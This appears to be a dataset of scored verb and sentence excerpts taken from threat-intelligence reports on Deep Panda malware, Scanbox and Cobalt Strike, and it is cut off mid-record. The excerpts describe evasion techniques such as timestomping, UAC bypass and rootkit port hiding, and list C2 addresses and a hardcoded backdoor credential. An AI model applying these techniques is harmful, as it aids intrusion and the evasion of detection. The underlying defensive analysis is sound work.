(0.6666666666666666, 'drop', '\n\nThis sample is a DLL which can be registered as a service and is used to drop a kernel driver and provide\nan interactive command line shell to the C2')(0.5714285714285714, 'provide', '\n\nThis sample is a DLL which can be registered as a service and is used to drop a kernel driver and provide\nan interactive command line shell to the C2')(0.4666666666666667, 'has', ' This sample has multiple communication capabilities available that makes it far more versatile\nand stealthy')(0.7142857142857143, 'starts', ' If the installation of the new\nservice is successful, the sample then starts the new service and exits')(1.0, 'copies', ' After it copies itself, it will modify the creation time, last access time and last modification    time to \n           the current system time when the copy was made but with the year changed to 2005')(0.21739130434782608, 'modify', ' After it copies itself, it will modify the creation time, last access time and last modification    time to \n           the current system time when the copy was made but with the year changed to 2005')(0.5625, 'provided', ' All three samples provided remote access to the attacker, via two Command and Control (C2) servers')(0.10344827586206896, 'hooking', '\n</section>\n\n<section>\n<heading>Hooking</heading>\nThe final step of the entry point is to begin hooking the system, which is done by two helper functions - one \nis designed to hook the system call table, while the other hooks the network stack')(0.8333333333333334, 'hook', '\n</section>\n\n<section>\n<heading>Hooking</heading>\nThe final step of the entry point is to begin hooking the system, which is done by two helper functions - one \nis designed to hook the system call table, while the other hooks the network stack')(1.0, 'remains', ' This means that after cleaning up the components dropped by the malware, the\nsystem remains vulnerable to local attacks by simply overwriting the legitimate rundll32.exe executable with\na malicious version and await it’s automatic execution by the Operating System')(0.8571428571428571, 'schedules', ' If McAfee AV is installed, creates a copy of regsvr32.exe named Update.exe and then schedules\n           the copy to be deleted on reboot using the well documented MoveFileExA API')(1.0, 'creates', ' If McAfee AV is installed, creates a copy of regsvr32.exe named Update.exe and then schedules\n           the copy to be deleted on reboot using the well documented MoveFileExA API')(0.47368421052631576, 'recovering', ' The capabilities include recovering authentication credentials from various system and client storage\nsuch as Mozilla Firefox, Internet Explorer, and Remote Access Service (RAS)')(0.5789473684210527, 'used', '\n\nThe dropped DLL (MD5: 47619fca20895abc83807321cbb80a3d) itself contains functionality that is typical\nof a Remote Access Tool(RAT) which are commonly used by PRC based actors in data exfiltration attacks')(0.5714285714285714, 'contains', '\n\nThe dropped DLL (MD5: 47619fca20895abc83807321cbb80a3d) itself contains functionality that is typical\nof a Remote Access Tool(RAT) which are commonly used by PRC based actors in data exfiltration attacks')(1.0, 'reads', '\n</section>\n\n<section>\n<heading>C2 Command Invocation</heading>\nThe main backdoor thread then reads commands from the chosen C2 protocol and passes them on to any\nof the following registered handler classes based upon a command ID')(0.6666666666666666, 'queries', '\n</section>\n\n<section>\n<heading>Network Stack Hooking</heading>\nThe network stack hooking first queries the OS version using RtlGetVersion() or PsGetVersion()')(0.8333333333333334, 'implements', ' It implements relatively well thought out protocols including HTTP and DNS')(0.6666666666666666, 'extracting', '\n\n</section>\n\n<footer>\nCROWDSTRIKE                                                                          S E N S I T I VE          2\n</footer>\n\x0c\x0c\n<header>DEEP PANDA</header>\n\n<section>\n\n\n                              <heading>TECHNICAL ANALYSIS</heading>\n\n<heading>Dropper Sample (MD5: 14c04f88dc97aef3e9b516ef208a2bf5)</heading>\nThe executable 14c04f88dc97aef3e9b516ef208a2bf5 is commonly referred to as a ‘dropper’, which is\ndesigned with the purpose of extracting from itself a malicious payload and to initialize and install it into a\ntargeted system')(0.5, 'opening', '\n</section>\n\n<section>\n<heading>Multiple Instance Protection</heading>\nThe driver begins by opening a named event in the BaseNamedObjects object directory with the name\n{8CB2ff21-0166-4cf1-BD8F-E190BC7902DC} using the Windows API ZwOpenEvent()')(1.0, 'performs', '\n</section>\n\n<section>\n<heading>Anti-Debugging Protection</heading>\nThe second component of the entry point performs an anti-debugging technique, calling the function\nKdDisableDebugger(), which allows the driver to disable usage of the built-in Windows kernel debugging\nfacility that is used by popular kernel debuggers KD and WinDbg')(0.125, 'calling', '\n</section>\n\n<section>\n<heading>Anti-Debugging Protection</heading>\nThe second component of the entry point performs an anti-debugging technique, calling the function\nKdDisableDebugger(), which allows the driver to disable usage of the built-in Windows kernel debugging\nfacility that is used by popular kernel debuggers KD and WinDbg')(0.7777777777777778, 'dropped', '\n</section>\n\n<section>\n<heading>System Driver</heading>\nThe kernel driver component dropped by the Backdoor DLL bears many tool marks associating it with the\nCCRootkit package publicly by Steven Lai (a/k/a embedlinux)')(0.625, 'hooking', '\n</section>\n\n<section>\n<heading>TCP Hook</heading>\nThe TCP hook works almost identically to the NSI hook, though instead hooking IOCTL 0x120003 (IOCTL_\nTCP_QUERY_INFORMATION_EX)')(0.8823529411764706, 'sets', '      infocardapi.dll\n</list>\n\nThe dropper sets the creation and last written timestamp of the newly created file to the date 2007-03-07 \n00:00:00; this allows the newly created malicious  DLL to blend in with other system files')(0.5, 'applying', ' Instead of hooking the entry in the\ntable directly, which is easily detectable, the driver uses the LDASM open-source disassembly engine to\nanalyze the function that is being pointed to by the table, and applying a Detours-style hook directly in the\ncode')(0.7777777777777778, 'implements', '\n</section>\n\n<section>\n<heading>PCC_PROXY: TCP Proxy</heading>\nThis handler class implements a generic TCP proxy')(0.14285714285714285, 'identifying', ' This class also supports\ngathering intelligence on the infected system including identifying security tools by their process name, proxy\naccounts, and version numbers for the Operating System (OS) and Internet Explorer')(0.3157894736842105, 'gathering', ' This class also supports\ngathering intelligence on the infected system including identifying security tools by their process name, proxy\naccounts, and version numbers for the Operating System (OS) and Internet Explorer')(0.9444444444444444, 'hooks', ' The unpacked kernel driver sample hooks these functions by reading the second \nDWORD at each of these exported functions')(0.46153846153846156, 'performing', ' Open source research of the 4 innocuous kernel APIs\n "ZwSaveKey ZwQueryValueKey ZwEnumerateValueKey IoAllocateMdl", in concert leads directly to a \n Chinese website that has a cached rootkit performing similar hooks on the same 3 registry related APIs')(0.2222222222222222, 'writes', ' As a\nprecaution, the sample writes settings directly to the Windows Registry to accomplish the same goal if\ninstalling the service with the documented APIs fails')(0.7777777777777778, 'set', ' The rundll32.exe is instantiated with a new NULL Security Identifier (SID)\n(S-1-0-0) with permissions set to grant all access to the file')(0.5714285714285714, 'initiates', ' \n\n\nAfter creating this window, the routine starts the main thread that eventually initiates calling out to the\nCommand and Control (C2)')(0.25, 'writing', '\n</section>\n\n<section>\n<heading>PCC_FILE: Browsing and Data Exfiltration</heading>\nThis handler class for command ID 8 implements generic directory and file browsing using FindFirstFileW() \nand FindNextFileW() APIs, as well as reading and writing arbitrary files via C2 commands, thus enabling upload and download of arbitrary files')(0.6666666666666666, 'control', ' It allows the adversary to view the main desktop graphically and\ncontrol the keyboard and mouse')(0.8333333333333334, 'view', ' It allows the adversary to view the main desktop graphically and\ncontrol the keyboard and mouse')(0.5714285714285714, 'remove', '\n\nCommand 0x20000001 exits the backdoor and 0x20000000 is issued to completely remove the backdoor\nfrom the system')(0.4, 'filter', '\n\nOne interesting command line option allows the backdoor to filter the contents of specified files to remove \ncontent using a regular expression (regex)')(0.2222222222222222, 'remove', '\n\nOne interesting command line option allows the backdoor to filter the contents of specified files to remove \ncontent using a regular expression (regex)')(0.5, 'receiving', '\n\nAfter establishing any of the aforementioned channels for arbitrary binary data exchange, the malware will\nstart sending and receiving compressed binary blobs via the channel of choice')(0.5, 'sending', '\n\nAfter establishing any of the aforementioned channels for arbitrary binary data exchange, the malware will\nstart sending and receiving compressed binary blobs via the channel of choice')(0.15789473684210525, 'proxy', ' The sample supports the ability to act as a generic proxy, this may be  \nintended to proxy C2 traffic for other infected machines in order to minimize the number of systems \ncommunicating to the C2, thus enhancing OPSEC')(0.7142857142857143, 'act', ' The sample supports the ability to act as a generic proxy, this may be  \nintended to proxy C2 traffic for other infected machines in order to minimize the number of systems \ncommunicating to the C2, thus enhancing OPSEC')(0.5909090909090909, 'modifies', ' This command then modifies the creation, modification, and last \naccess timestamps of the modified file to conceal the content modifications')(0.3684210526315789, 'prevents', " When the dropper writes the file to disk, the first byte of the file is 'Z' \nwhich prevents the file from executing or being detected as an executable by many defensive tools")(1.0, 'writes', " When the dropper writes the file to disk, the first byte of the file is 'Z' \nwhich prevents the file from executing or being detected as an executable by many defensive tools")(0.5882352941176471, 'use', "\n\nAdditionally, the malware contains a custom DNS client implementation that will use the system's configured DNS server to tunnel C2 traffic over legitimate DNS")(0.5833333333333334, 'tunnel', "\n\nAdditionally, the malware contains a custom DNS client implementation that will use the system's configured DNS server to tunnel C2 traffic over legitimate DNS")(0.38095238095238093, 'contains', "\n\nAdditionally, the malware contains a custom DNS client implementation that will use the system's configured DNS server to tunnel C2 traffic over legitimate DNS")(0.3157894736842105, 'bypass', ' It also is able to bypass User Account Control (UAC) to install\nitself by using the ‘sysprep.exe’ Microsoft Windows executable provided by the targeted system')(0.5, 'dropped', "\n</section>\n\n<footer>\nCROWDSTRIKE                                                                       S E N S I T I VE            4\n</footer>\n\x0c\n<header>DEEP PANDA</header>\n\n<section>\n\n<heading>Backdoor DLL Sample (MD5: 47619fca20895abc83807321cbb80a3d)</heading>\nThis sample is a 'backdoor' which is the DLL dropped by the dropper sample file with an MD5 of \n14c04f88dc97aef3e9b516ef208a2bf5")(0.29411764705882354, 'is', "\n</section>\n\n<footer>\nCROWDSTRIKE                                                                       S E N S I T I VE            4\n</footer>\n\x0c\n<header>DEEP PANDA</header>\n\n<section>\n\n<heading>Backdoor DLL Sample (MD5: 47619fca20895abc83807321cbb80a3d)</heading>\nThis sample is a 'backdoor' which is the DLL dropped by the dropper sample file with an MD5 of \n14c04f88dc97aef3e9b516ef208a2bf5")(0.6111111111111112, 'write', ' A typical path is C:\\Documents and Settings\\All Users\\Documents.”\n\n\nThe dropper attempts to write the malicious payload to one of the following names, using the first \navailable name in this set:\n<list>\n       1')(0.8666666666666667, 'Adds', ' Adds itself to list of services started by ‘netsvc’ using the service name ‘helpsvc’')(0.6666666666666666, 'used', '\n\n While the various network hooking techniques used in the kernel driver may appear novel or well\n researched, upon close inspection it is actually a line-for-line copy of an existing post from the now-offline\n ‘rootkit.com’ by a Chinese language developer')(0.5, 'launching', ' \nAdditionally, this class implements launching of specified executable files via the CreateProcess() API')(0.7142857142857143, 'implements', ' This export then implements the actual install logic to maintain persistence and invoke the main\nroutine')(1.0, 'opens', "\nThe dropper subsequently opens the dropped file and corrects the header by writing the 'M' over the first \nbyte, allowing the file to be executed")(0.45454545454545453, 'corrects', "\nThe dropper subsequently opens the dropped file and corrects the header by writing the 'M' over the first \nbyte, allowing the file to be executed")(0.5384615384615384, 'connect', ' Thus the sample will only attempt to connect directly using \na raw socket to the C2 located at 1.9.5.38:443')(0.9090909090909091, 'is', ' \n</section>\n\n<section>\n<heading>Backdoor Functionality, Supported Commands</heading>\nThe primary aim of this backdoor is remote desktop control functionality comparable to VNC or Remote\nDesktop over a custom protocol')(0.43478260869565216, 'contains', ' The con-\nfiguration contains the C2 protocol to be used or optionally a self-configuration mode in which the malware \nattempts the different C2 protocols in a pre-defined order')(0.8181818181818182, 'attempts', ' The con-\nfiguration contains the C2 protocol to be used or optionally a self-configuration mode in which the malware \nattempts the different C2 protocols in a pre-defined order')(0.5294117647058824, 'enables', ' In this case, the malicious payload is a Dynamic-Link Library (DLL), which enables an\nattacker to have full control of the system')(1.0, 'sent', ' The version of the malicious sample, in this case it is 841\n</list>\n<figure></figure>\n\n\nAn example authentication packet sent to the C2 is located in Appendix E')(0.6666666666666666, 'executed', '\n</section>\n\n<section>\n<heading>Post Exploitation Tool</heading>\nThe post exploitation tool (MD5: 2dce7fc3f52a692d8a84a0c182519133) is a dual-use tool, it can be\ndropped and executed by a client-side exploit, or the adversary can launch it using a variety of command\nline options')(0.36363636363636365, 'launch', '\n</section>\n\n<section>\n<heading>Post Exploitation Tool</heading>\nThe post exploitation tool (MD5: 2dce7fc3f52a692d8a84a0c182519133) is a dual-use tool, it can be\ndropped and executed by a client-side exploit, or the adversary can launch it using a variety of command\nline options')(0.8333333333333334, 'install', ' After attempting to disable the existing service, the malware tries to install itself as\na service with that same name')(1.0, 'gathering', '\n</section>\n\n<section>\n<heading>PCC_MISC : Gather and report system information</heading>\nThe malware is capable of gathering various pieces of information from the system, triggered by a command\nID 10')(0.375, 'sent', '\n       \U00100194 The currently logged in username in the system as obtained with the GetUserName() API \n       \U00100194 The machine\'s uptime\n       \U00100194 The Windows Version and Service Pack level\n       \U00100194 The amount of available Physical Memory in MB\n       \U00100194 Current Remote Desktop sessions as enumerated with WTSEnumerateSessions\n       \U00100194 A string identifier statically set to "FBI20111024"\n</list>\nThe beacon is encrypted using an XOR/ADD loop using the statically defined key 0x1C and sent to the C2')(0.42105263157894735, 'downloading', '\n\nWhile there is code in the binary that allows downloading a list of C2 servers from an HTTP URL, the default\nconfiguration present specifies 202.86.190.3:80 as a C2 to use, this is the same Hong Kong C2 server as \nthe one used by the post exploitation .NET tool')(0.3, 'manage', '\n</section>\n\n<section>\n<heading>PCC_SYS: System Management</heading>\nThis handler class provides the attacker with the ability to manage system components including start/stop/\ndelete system services, enumerate/alter registry keys, and manage running processes')(0.9, 'load', "\n\nThe final step the dropper performs is to load the dropped DLL into its own process space; it then resolves \nthe export 'OpenINFOPerformanceData' from the DLL and invokes it with the dropped DLL's filename as \nparameter")(0.75, 'write', ' One sample is typical of what is commonly referred to as a ‘dropper’ because its primary purpose is to write a malicious component to disk and connect it to the targeted hosts operating system')(0.9411764705882353, 'shares', ' The sample contains ‘dead code’ which appears to be\ncommand and control server classes, this is likely an indicator that the C2 client which would communicate\nwith this sample shares the same communications library which was compiled into this sample')(0.6, 'terminating', ' This command results in the DLL deleting itself\nand terminating the backdoor process')(0.38095238095238093, 'implements', ' This kernel mode rootkit implements several\nhooking techniques that are aimed at preventing a system administrator from detecting the backdoor DLL')(0.5714285714285714, 'preventing', ' This kernel mode rootkit implements several\nhooking techniques that are aimed at preventing a system administrator from detecting the backdoor DLL')(0.5, 'resolves', ' The sample first \nresolves several library functions provided by Microsoft using the LoadLibrary() and GetProcAddress()\nApplication Programming Interfaces (APIs)')(0.5833333333333334, 'utilizes', ' The sample utilizes the AES cryptographic algorithm to protect its C2\ncommunications')(0.4444444444444444, 'implements', '\n</section>\n<section>\n<heading>Backdoor DLL Sample (MD5: de7500fc1065a081180841f32f06a537)</heading>\n</section>\n\n<section>\n<heading>Backdoor DLL Sample (MD5: de7500fc1065a081180841f32f06a537)</heading>\nThis sample is a sophisticated backdoor which implements several communications protocols and was\ndeveloped in C++')(0.375, 'is', '\n</section>\n<section>\n<heading>Backdoor DLL Sample (MD5: de7500fc1065a081180841f32f06a537)</heading>\n</section>\n\n<section>\n<heading>Backdoor DLL Sample (MD5: de7500fc1065a081180841f32f06a537)</heading>\nThis sample is a sophisticated backdoor which implements several communications protocols and was\ndeveloped in C++')(0.7142857142857143, 'hide', ' This driver attempts to hide a wide swath of TCP ports (40000-45000) for\nan unknown reason, however it is suspected that this may relate to the potential network relaying capability\nalluded to for the backdoor dll')(0.5714285714285714, 'having', ' The third sample was a sophisticated implant that in addition to having multiple communication capabilities, and the ability to act as a relay for other infected hosts, utilized a kernel mode driver that can hide aspects of the tool from user-mode tools')(0.7272727272727273, 'act', ' The third sample was a sophisticated implant that in addition to having multiple communication capabilities, and the ability to act as a relay for other infected hosts, utilized a kernel mode driver that can hide aspects of the tool from user-mode tools')(0.19230769230769232, 'utilized', ' The third sample was a sophisticated implant that in addition to having multiple communication capabilities, and the ability to act as a relay for other infected hosts, utilized a kernel mode driver that can hide aspects of the tool from user-mode tools')(0.4666666666666667, 'hide', ' The third sample was a sophisticated implant that in addition to having multiple communication capabilities, and the ability to act as a relay for other infected hosts, utilized a kernel mode driver that can hide aspects of the tool from user-mode tools')(0.5294117647058824, 'avoid', ' The tool has the\nability to automatically down select the most effective communication channel once it has been instantiated,\nwhich can help avoid detection from solutions like DNS blacklisting and RFC protocol enforcement')(0.6153846153846154, 'select', ' The tool has the\nability to automatically down select the most effective communication channel once it has been instantiated,\nwhich can help avoid detection from solutions like DNS blacklisting and RFC protocol enforcement')(1.0, 'sends', '\nThe malware sends and receives a heartbeat/keepalive packet every 2 minutes')(0.5, 'receives', '\nThe malware sends and receives a heartbeat/keepalive packet every 2 minutes')(0.8571428571428571, 'establishing', ' It supports establishing TCP connections to other hosts\nand also listening for incoming connections')(0.6666666666666666, 'listening', ' It supports establishing TCP connections to other hosts\nand also listening for incoming connections')(0.7777777777777778, 'dropped', '\n</section>\n<section>\n<heading>System Driver</heading>\nThe kernel driver component dropped by the Backdoor DLL bears many tool marks associating it with the\nCCRootkit package publicly by Steven Lai (a/k/a embedlinux)')(0.8888888888888888, 'use', ' During installation, the sample attempts to use documented APIs such as\nOpenSCManager() and CreateService() to initialize itself as a persistent Windows service')(0.5, 'prevent', ' This is meant to \nprevent identification during disk forensics using a common investigative technique called a forensic \nanalysis timeline')(0.5833333333333334, 'take', ' This class also\nprovides the ability for the attacker to take a screen shot of the users desktop')(0.7142857142857143, 'support', ' The command line options support post exploitation capabilities such as changing \nfile timestamps, forensic mitigation, privilege escalation, launching the executable, and specifying a specific\nC2')(0.9, 'avoids', ' This is particularly relevant in this case because the backdoor DLL sample with an MD5\n of de7500fc1065a081180841f32f06a537 specifically avoids installing the kernel driver on a system running \n this tool')(1.0, 'installing', '\nExamples of implemented commands include download and upload files, installing new .NET assemblies,\ncalling methods on those assemblies, connecting to new C2 servers and executing processes')(1.0, 'upload', '\nExamples of implemented commands include download and upload files, installing new .NET assemblies,\ncalling methods on those assemblies, connecting to new C2 servers and executing processes')(0.625, 'connecting', '\nExamples of implemented commands include download and upload files, installing new .NET assemblies,\ncalling methods on those assemblies, connecting to new C2 servers and executing processes')(1.0, 'calling', '\nExamples of implemented commands include download and upload files, installing new .NET assemblies,\ncalling methods on those assemblies, connecting to new C2 servers and executing processes')(0.8823529411764706, 'filters', ' This hook also filters \nany connections listening on TCP ports in the range between 40000 and 45000')(0.6666666666666666, 'avoid', ' If the event already \nexists, the driver fails to load, presumably to avoid a\n\n<footer>\nCROWDSTRIKE                                                                      S E N S I T I VE         14\n</footer>\n\x0c\n<header>DEEP PANDA</header>\n\n\nmultiple instances of itself')(0.7, 'creates', ' If the event does not exist, the driver then creates it using the Windows API\nZwCreateEvent()')(1.0, 'sending', '\n\nAfter sending the initial authentication packet, the sample verifies that the first four bytes of the response is \nequal to a statically defined value, in this sample the value is: 0x16030100')(0.4074074074074074, 'allows', ' This allows any user to have complete control \nover the machine, as rundll32.exe is frequently launched by tasks such as changing the time, wallpaper,\nor other system settings')(0.8181818181818182, 'set', ' The registry change creates the following key:\n<list>\nHKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\msupdate\\\\Parameters\n</list>\nFollowing this, the subroutine will set the value of the ‘ServiceDLL’ to the module handle of the DLL')(0.75, 'creates', ' The registry change creates the following key:\n<list>\nHKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\msupdate\\\\Parameters\n</list>\nFollowing this, the subroutine will set the value of the ‘ServiceDLL’ to the module handle of the DLL')(0.631578947368421, 'added', '\n\n\n<footer>\n\nCROWDSTRIKE                                                                             S E N S I T I VE           7\n</footer>\n\x0c\n<header>DEEP PANDA</header>\n\n\nWhen command 0x23000004 is received, a temporary new user “_DomainUser_” with password “Dom4!nU-\nserP4ss” is created and added to the local Administrators group')(0.7142857142857143, 'sends', '\n\nThe malicious sample sends an initial beacon to the C2 that includes the following information:\n<list>\n       \U00100194 The computer name as obtained with the GetComputerName() API\n       \U00100194 The username of the current Remote Desktop session if currently being executed in a Remote\n          Desktop session or “none” otherwise')(0.75, 'spawns', ' If the installation fails, the sample\nspawns a new process using rundll32.exe, this executable will instantiate the DLL and can call a specific \nexported function')(0.23333333333333334, 'has', '\n</section>\n\n<section>\n<heading>C2 Communication Mechanisms</heading>\nThe malware has three distinct C2 protocols two of which can be transmitted over HTTP proxies and one\ncan be bundled in two different ‘dual’ modes (see 3.), totaling 7 distinct supported C2 mechanisms')(0.8333333333333334, 'receiving', '\n\n\nThe following python function can be used to decode the beacon stings:\n<code>\n def decode(crypted):\n decoded=””\n   for x in crypted:\n     decoded+=chr(((ord(x)^(0x1C +1)) + (0x1C +1)) & 0xFF)\n   return decoded\n</code>\n\n\n<footer>\nCROWDSTRIKE                                                                          S E N S I T I VE            6\n</footer>\n\x0c\n<header>DEEP PANDA</header>\n\n\nAfter sending the initial beacon, the routine loops receiving incoming commands and executes them in\nsequence')(0.4, 'sending', '\n\n\nThe following python function can be used to decode the beacon stings:\n<code>\n def decode(crypted):\n decoded=””\n   for x in crypted:\n     decoded+=chr(((ord(x)^(0x1C +1)) + (0x1C +1)) & 0xFF)\n   return decoded\n</code>\n\n\n<footer>\nCROWDSTRIKE                                                                          S E N S I T I VE            6\n</footer>\n\x0c\n<header>DEEP PANDA</header>\n\n\nAfter sending the initial beacon, the routine loops receiving incoming commands and executes them in\nsequence')(0.8, 'executes', '\n\n\nThe following python function can be used to decode the beacon stings:\n<code>\n def decode(crypted):\n decoded=””\n   for x in crypted:\n     decoded+=chr(((ord(x)^(0x1C +1)) + (0x1C +1)) & 0xFF)\n   return decoded\n</code>\n\n\n<footer>\nCROWDSTRIKE                                                                          S E N S I T I VE            6\n</footer>\n\x0c\n<header>DEEP PANDA</header>\n\n\nAfter sending the initial beacon, the routine loops receiving incoming commands and executes them in\nsequence')(0.6666666666666666, 'installed', ' The malicious component in this case is what is commonly referred to as a Remote Access Tool (RAT), this RAT is manifested as a Dynamic Link Library (DLL) installed as a service')(0.4782608695652174, 'Adds', " Adds itself as a service name from the backdoor's configuration under HKEY_LOCAL_\n           MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\<service>” This defaults to “wuauserv”,\n           the legitimate Windows Update service, in the given binary's default configuration")(0.9, 'scan', ' The\npurpose of the hook is to scan the list of active connections returned to the user, and hide any such\nconnection currently bound to a local TCP port in\n\n\n\n<footer>\nCROWDSTRIKE                                                                           S E N S I T I VE        15\n</footer>\n\x0c\n<header>DEEP PANDA</header>\n\n\nthe range between 40000 and 45000')(0.85, 'hide', ' The\npurpose of the hook is to scan the list of active connections returned to the user, and hide any such\nconnection currently bound to a local TCP port in\n\n\n\n<footer>\nCROWDSTRIKE                                                                           S E N S I T I VE        15\n</footer>\n\x0c\n<header>DEEP PANDA</header>\n\n\nthe range between 40000 and 45000')(1.0, 'checks', ' It then checks for the values of the\n“ServiceDll” and “Security” keys, in the latter case it applies an XOR on the data with the value 127')(0.4166666666666667, 'access', ' Once the proper API’s have been resolved, the sample then\nassigns a NULL SID to the rundll32.exe executable and sets the current process’ Window Station to\n“winsta0”, which enables the sample to access the real user’s desktop if started as service')(1.0, 'loads', '\n\n\n<footer>\nCROWDSTRIKE                                                                         S E N S I T I VE             11\n</footer>\n\x0c\n<header>DEEP PANDA</header>\n\n\nIf the current service name matches a set of pre-defined service names that legitimately exist in Windows, \nthe backdoor then loads the original service’s DLL into the address space with LoadLibrary and invokes the\nServiceMain export')(0.8461538461538461, 'launching', ' If the input is not in this list of built-in\ncommands, the malware attempts to invoke cmd.exe in the background, launching a command or command\nline utility already present on the system')(0.5, 'searching', ' This is typically seen in RATs for searching specific files to exfiltrate')(0.42857142857142855, 'remove', ' The second sample analyzed is a dual use tool that can function both as a post exploitation tool used to infect other systems, download additional tools, remove log data, and itself be used as a backdoor')(0.3333333333333333, 'download', ' The second sample analyzed is a dual use tool that can function both as a post exploitation tool used to infect other systems, download additional tools, remove log data, and itself be used as a backdoor')(1.0, 'infect', ' The second sample analyzed is a dual use tool that can function both as a post exploitation tool used to infect other systems, download additional tools, remove log data, and itself be used as a backdoor')(0.5, 'fool', ' This may be an\nattempt to fool some automated dynamic analysis or anti-malware software into believing this is the\nlegitimate ESET AV software')(1.0, 'serves', ' The GET request serves as a down-stream\n          channel while the POST request serves as a upstream channel')(1.0, 'receiving', ' This one HTTP connection will be used for bi-directional\n          communications, sending chunks of POST payload and receiving chunks of the response,\n          interleaved')(0.5555555555555556, 'sending', ' This one HTTP connection will be used for bi-directional\n          communications, sending chunks of POST payload and receiving chunks of the response,\n          interleaved')(0.8333333333333334, 'replaces', ' If the service is present, the malware replaces its previous instances or\nversions of this backdoor')(0.3333333333333333, 'is', '\n</section>\n\n\n<footer>\n CROWDSTRIKE                                                                          S E N S I T I VE             25\n</footer> \n\x0c\n<header>DEEP PANDA</header>\n\n<section>\n\n<heading>Implant #2</heading>\n<heading>Backdoor DLL</heading>\nThis DLL is a moderately sophisticated backdoor with several well designed communication mechanisms\nnot typically seen in these types of implants')(0.8461538461538461, 'initiates', ' The command \n0x22000001 initiates continuous transmission of screen captures to the C2')(1.0, 'implements', '\n</section>\n\n<section>\n<heading>INTERNAL_CMD: Command-Line Shell</heading>\n\n\n\n<footer>\nCROWDSTRIKE                                                                         S E N S I T I VE          13\n</footer>\n\x0c\n<header>DEEP PANDA</header>\n\n\nThis handler class uses the command ID 5 and implements an interactive command line shell accessible\nfrom the C2 server, containing a series of built-in commands')(0.5384615384615384, 'sent', ' Other domains resolving to the same IP include the following:\nBetween August 30, 2014 and September 16, 2014 we also observed SOGU (aka Kaba) callback traffic sent to assign.ddnsking.com over port 443')(0.5384615384615384, 'resolved', '\nThe Poison Ivy implant had the following configuration properties:\n<list>\nC2: quakegoogle.servequake.com, Port: 80\nPassword: qeTGd3485fF\nMutex: )!VoqA.I4\n</list>\nThe C2 domain quakegoogle.servequake[.]com resolved to 115.126.62.100 at the time of the SWCs')(0.5454545454545454, 'downloaded', ' In turn, these exploits downloaded and decoded a payload hosted at: hxxp://103.27.108.45/img/js.php')(0.7222222222222222, 'dropped', ' The compromised websites contained an iframe to direct site visitors to a threat actor-controlled IP address that dropped a Poison Ivy remote access tool (RAT) onto victims’ systems')(0.391304347826087, 'direct', ' The compromised websites contained an iframe to direct site visitors to a threat actor-controlled IP address that dropped a Poison Ivy remote access tool (RAT) onto victims’ systems')(1.0, 'compromise', ' The group was able to compromise these websites and insert malicious iframes')(0.6666666666666666, 'insert', ' The group was able to compromise these websites and insert malicious iframes')(0.8571428571428571, 'directed', '\nThe iframes on these websites directed visitors to Java exploits hosted at 103.27.108.45')(0.8571428571428571, 'sending', ' This Javascript file is a framework for reconnaissance that the attackers call "Scanbox" and includes some of the techniques we described in a previous blog post: <list>Attackers abusing Internet Explorer to enumerate software and detect security products</list>\nThe Scanbox framework first configures the remote C&C server that it will use and collects a small amount of information about the victim that is visiting the compromised website including:\n<list>\n      Referer\n      User-Agent\n      Location\n      Cookie\n      Title (To identify specific content that the victim is visiting)\n      Domain\n      Charset\n      Screen width and height\n      Operating System\n      Language\n</list>\nResulting in something like this:\nBefore sending the information to the C&C server, Scanbox encodes and encrypts the data with the following function:\nProducing the following request:\nIf we decrypt the data it translates to:\nAfter the first request, the framework contains several plugins to extract different information from the victim')(0.14814814814814814, 'is', ' This Javascript file is a framework for reconnaissance that the attackers call "Scanbox" and includes some of the techniques we described in a previous blog post: <list>Attackers abusing Internet Explorer to enumerate software and detect security products</list>\nThe Scanbox framework first configures the remote C&C server that it will use and collects a small amount of information about the victim that is visiting the compromised website including:\n<list>\n      Referer\n      User-Agent\n      Location\n      Cookie\n      Title (To identify specific content that the victim is visiting)\n      Domain\n      Charset\n      Screen width and height\n      Operating System\n      Language\n</list>\nResulting in something like this:\nBefore sending the information to the C&C server, Scanbox encodes and encrypts the data with the following function:\nProducing the following request:\nIf we decrypt the data it translates to:\nAfter the first request, the framework contains several plugins to extract different information from the victim')(0.625, 'extract', ' This Javascript file is a framework for reconnaissance that the attackers call "Scanbox" and includes some of the techniques we described in a previous blog post: <list>Attackers abusing Internet Explorer to enumerate software and detect security products</list>\nThe Scanbox framework first configures the remote C&C server that it will use and collects a small amount of information about the victim that is visiting the compromised website including:\n<list>\n      Referer\n      User-Agent\n      Location\n      Cookie\n      Title (To identify specific content that the victim is visiting)\n      Domain\n      Charset\n      Screen width and height\n      Operating System\n      Language\n</list>\nResulting in something like this:\nBefore sending the information to the C&C server, Scanbox encodes and encrypts the data with the following function:\nProducing the following request:\nIf we decrypt the data it translates to:\nAfter the first request, the framework contains several plugins to extract different information from the victim')(0.4444444444444444, 'sent', '\n</list>\nWhile the user is browsing the compromised website, all keystrokes are being recorded and sent to the C&C periodically')(0.7, 'loaded', '\nThe attackers were able to compromise the website and include code that loaded a malicious Javascript file from a remote server')(1.0, 'compromise', '\nThe attackers were able to compromise the website and include code that loaded a malicious Javascript file from a remote server')(0.09090909090909091, 'executing', "                                                               Page 10 </footer>\n\n<header> \x0c                                  Analysis on APT-to-be Attack That Focusing on China's Government Agency </header>\n\n\n\n\n                              <figure></figure> <caption> Figure 16 Comparison of module 3 data package </caption>\n\n\n3.4 Characteristics of Cobalt Strike\n\nUsing Cobalt Strike attack can execute various operations in the targeted systems, such as downloading and\nuploading files, executing designated programs, injecting keyboard recorder, executing commands via PowerShell,\nimporting PowerShell script, executing commands via CMD, accessing system passwords and so on")(0.17391304347826086, 'execute', "                                                               Page 10 </footer>\n\n<header> \x0c                                  Analysis on APT-to-be Attack That Focusing on China's Government Agency </header>\n\n\n\n\n                              <figure></figure> <caption> Figure 16 Comparison of module 3 data package </caption>\n\n\n3.4 Characteristics of Cobalt Strike\n\nUsing Cobalt Strike attack can execute various operations in the targeted systems, such as downloading and\nuploading files, executing designated programs, injecting keyboard recorder, executing commands via PowerShell,\nimporting PowerShell script, executing commands via CMD, accessing system passwords and so on")(0.5, 'accessing', "                                                               Page 10 </footer>\n\n<header> \x0c                                  Analysis on APT-to-be Attack That Focusing on China's Government Agency </header>\n\n\n\n\n                              <figure></figure> <caption> Figure 16 Comparison of module 3 data package </caption>\n\n\n3.4 Characteristics of Cobalt Strike\n\nUsing Cobalt Strike attack can execute various operations in the targeted systems, such as downloading and\nuploading files, executing designated programs, injecting keyboard recorder, executing commands via PowerShell,\nimporting PowerShell script, executing commands via CMD, 